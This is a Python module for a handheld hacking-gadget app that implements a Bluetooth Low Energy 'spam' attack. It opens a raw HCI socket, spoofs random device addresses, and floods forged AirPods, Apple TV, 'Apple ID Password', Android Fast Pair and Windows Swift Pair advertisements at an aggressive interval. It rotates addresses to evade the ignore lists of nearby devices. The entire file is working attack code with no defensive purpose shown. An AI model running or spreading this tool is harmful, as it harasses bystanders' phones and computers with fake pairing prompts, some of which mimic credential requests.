"""BLE Spam — Advanced spoofing for Apple/Android/Windows pairing popups."""
from __future__ import annotations

import os
import socket
import struct
import threading
import time
import random
from typing import TYPE_CHECKING

import pygame
from bigbox import theme
from bigbox.events import Button, ButtonEvent

if TYPE_CHECKING:
    from bigbox.app import App


# BLE Advertisement Packets (AppleJuice, Fast Pair, Swift Pair)
# Data format: [Length] [Type=0xFF (Manufacturer Specific)] [Company ID] [Payload]
PROFILES = [
    ("AirPods Pro", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("AirPods Max", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Powerbeats Pro", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Apple TV Setup", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Apple ID Password", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Android Fast Pair", b"\x06\x00\x03\x02\x2d\xfe\x06\x16\x2d\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Windows Swift Pair", b"\x1e\xff\x06\x00\x03\x00\x80\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Kitchen Sink (All)", b"ALL"),
]


class BLESpamView:
    def __init__(self) -> None:
        self.dismissed = False
        self.running = False
        self.cursor = 0
        self.error_msg = ""
        self.packets_sent = 0
        
        self._stop_event = threading.Event()
        self._spam_thread: threading.Thread | None = None
        
        self.title_font = pygame.font.Font(None, 36)
        self.body_font = pygame.font.Font(None, 24)

    def handle(self, ev: ButtonEvent, ctx: App) -> None:
        if not ev.pressed: return

        if ev.button is Button.B:
            self._stop()
            self.dismissed = True
        elif ev.button is Button.UP and not self.running:
            self.cursor = (self.cursor - 1) % len(PROFILES)
        elif ev.button is Button.DOWN and not self.running:
            self.cursor = (self.cursor + 1) % len(PROFILES)
        elif ev.button is Button.A:
            if self.running:
                self._stop()
            else:
                self._start()

    def _start(self):
        self.running = True
        self.error_msg = ""
        self.packets_sent = 0
        self._stop_event.clear()
        self._spam_thread = threading.Thread(target=self._spam_loop, daemon=True)
        self._spam_thread.start()

    def _stop(self):
        self._stop_event.set()
        if self._spam_thread:
            self._spam_thread.join(timeout=1.0)
        self.running = False

    def _spam_loop(self):
        try:
            # Open raw HCI socket
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
            sock.bind((0,)) # hci0

            # 1. Reset Bluetooth controller to a known clean state
            self._hci_send_cmd(sock, 0x03, 0x0003, b"") # Reset
            time.sleep(0.1)

            # 2. Set Random Address (Spoofing)
            def set_rand_mac():
                mac = bytes([random.randint(0, 255) for _ in range(6)])
                # Must have top two bits set for 'Static Random Address'
                mac = bytes([mac[0] | 0xC0]) + mac[1:]
                self._hci_send_cmd(sock, 0x08, 0x0005, mac)
            
            set_rand_mac()

            # 3. Set Advertising Parameters
            # Interval min/max: 0x0020 (20ms) - VERY AGGRESSIVE
            params = struct.pack("<HHBBB6sBB", 0x0020, 0x0020, 0x00, 0x01, 0x00, b"\x00"*6, 0x07, 0x00)
            self._hci_send_cmd(sock, 0x08, 0x0006, params)

            while not self._stop_event.is_set():
                # Randomize MAC every few seconds to bypass ignore lists
                if self.packets_sent % 50 == 0:
                    self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00") # Stop
                    set_rand_mac()
                    self._hci_send_cmd(sock, 0x08, 0x000a, b"\x01") # Start

                # Select data
                profile_name, profile_data = PROFILES[self.cursor]
                if profile_data == b"ALL":
                    # Cycle through all except the "ALL" entry itself
                    actual_profiles = [p for p in PROFILES if p[1] != b"ALL"]
                    profile_data = random.choice(actual_profiles)[1]

                # 4. Set Advertising Data (Aggressive update)
                # Length byte + data + padding to 31 bytes
                cmd_data = bytes([len(profile_data)]) + profile_data.ljust(31, b"\x00")
                self._hci_send_cmd(sock, 0x08, 0x0008, cmd_data)
                
                # Ensure it's started
                self._hci_send_cmd(sock, 0x08, 0x000a, b"\x01")
                
                self.packets_sent += 1
                time.sleep(0.1)

            # Cleanup
            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00") # Stop
            sock.close()

        except Exception as e:
            self.error_msg = f"HCI Error: {e}"
            self.running = False

    def _hci_send_cmd(self, sock: socket.socket, ogf: int, ocf: int, data: bytes):
        opcode = (ogf << 10) | ocf
        # 0x01 = HCI Command Packet
        packet = struct.pack("<BHB", 0x01, opcode, len(data)) + data
        sock.send(packet)

    def render(self, surf: pygame.Surface) -> None:
        surf.fill(theme.BG)
        
        title = self.title_font.render("BLE SPAM :: ULTIMATE_SPOOF", True, theme.ACCENT)
        surf.blit(title, (theme.PADDING, theme.PADDING))

        status_text = f"STATUS: ATTACKING ({self.packets_sent})" if self.running else "STATUS: READY"
        status_color = theme.ERR if self.running else theme.FG
        s_surf = self.body_font.render(status_text, True, status_color)
        surf.blit(s_surf, (theme.PADDING, 60))

        if self.error_msg:
            e_surf = self.body_font.render(self.error_msg, True, theme.ERR)
            surf.blit(e_surf, (theme.PADDING, 90))

        # Visual indicator (scanner-like line)
        if self.running:
            scan_x = (int(time.time() * 400) % (theme.SCREEN_W - 40)) + 20
            pygame.draw.line(surf, theme.ACCENT, (scan_x, 100), (scan_x, 110), 4)

        # Profile List
        list_y = 120
        for i, (name, _) in enumerate(PROFILES):
            y = list_y + i * 30
            if y > theme.SCREEN_H - 80: break
            
            color = theme.ACCENT if i == self.cursor else theme.FG_DIM
            if i == self.cursor and not self.running:
                pygame.draw.rect(surf, theme.SELECTION_BG, (theme.PADDING, y-4, 300, 26), border_radius=4)
            
            p_surf = self.body_font.render(f"[{'*' if self.running and i == self.cursor else ' '}] {name}", True, color)
            surf.blit(p_surf, (theme.PADDING + 10, y))

        if self.running:
            msg = "Broadcasting spoofed pairing packets..."
            m_surf = self.body_font.render(msg, True, theme.FG)
            surf.blit(m_surf, (theme.PADDING, theme.SCREEN_H - 80))

        hint = self.body_font.render("A: Toggle Attack  UP/DN: Select  B: Back", True, theme.FG_DIM)
        surf.blit(hint, (theme.PADDING, theme.SCREEN_H - 30))
